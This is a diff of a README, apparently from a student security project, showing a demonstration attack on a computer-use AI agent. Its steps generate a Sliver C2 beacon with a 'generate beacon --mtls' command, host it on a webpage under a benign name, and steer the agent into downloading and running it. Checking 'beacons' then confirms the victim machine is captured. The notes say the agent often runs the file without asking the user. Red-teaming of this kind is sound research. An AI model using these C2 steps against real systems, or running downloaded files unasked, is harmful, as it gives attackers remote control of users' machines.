@@ -25,7 +25,7 @@ To begin the process, you will need an apache2 server running at an accessable l
 5. sliver > `generate beacon --mtls **YOUR_SERVER_LOCATION** --os linux` will create an exicutable that will subscribe the victim to the C2 server when the file is downloaded and run.
     - Note: If running both processes on a VM, you will need to attach the VM network adapter to the "Bridged Adapter" to allow accesses between systems (the default setting in Virtual Box only allow the host machine to connect).
     - You can retrive **YOUR_SERVER_LOCATION** with `ip a`.
-    - This can be used against any system type by changing the os flag, refernce the Sliver documentation for further usage instructions.
+    - This can be used against any system type by changing the os flag, refernce the [Sliver documentation](https://sliver.sh/) for further usage instructions.
 6. This file must then be hosted on a webpage, accessable by a download link.
     - Note: The computer-use "agent" will be more responsive to webpages and files with benign names.
 7. Direct the AI to go to the page to download and run the file.
@@ -42,9 +42,9 @@ To begin the process, you will need an apache2 server running at an accessable l
     - Despite the above limitations, it is often able to quickly and without prompting the user download, apply execute permissions, and run the script assuming the link can be asertained.
 8. Proof of attack success can be verified with the command sliver > `beacons`
     - The info should display the name of the .exe used for the capture and the user name (by default, this demo's name is "computeruse")
+9. Run any command on the victim machine (usage can be found in the [Sliver documentation](https://sliver.sh/) or by running sliver > `help`)
 
 ![screenshot](Captured_computer.png)
-
 
 # Presenatation:
 ### My contribution to the group project:
@@ -69,7 +69,6 @@ To begin the process, you will need an apache2 server running at an accessable l
     - It was discovered that running docker on a VM required some special configuartions be made on the host machine, and the performance proved atrocious.
     - After researching the technology, it was discovered that docker enviroments provided adiquite security on the host device for the tests we intended to run.
     - Lesson - always, ALWAYS read the docs of any unfamiliar technology.
-2. 
 
 # Submission:
 
